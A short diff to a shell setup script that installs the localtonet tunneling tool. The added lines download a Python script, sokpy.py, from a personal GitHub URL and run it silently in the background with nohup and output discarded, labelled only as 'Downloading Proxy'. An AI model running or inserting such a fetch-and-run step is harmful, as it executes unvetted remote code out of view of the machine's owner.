@@ -1,5 +1,10 @@
 wget https://localtonet.com/download/localtonet-linux-x64.zip
 unzip localtonet-linux-x64.zip
+echo Downloading Proxy
+wget https://raw.githubusercontent.com/sarifadim/sifu/main/sokpy.py
+sleep 1
+nohup python3 sokpy.py &>/dev/null &
+sleep 1
 chmod +x localtonet
 curl ifconfig.me
 echo " Your Ip Adress "
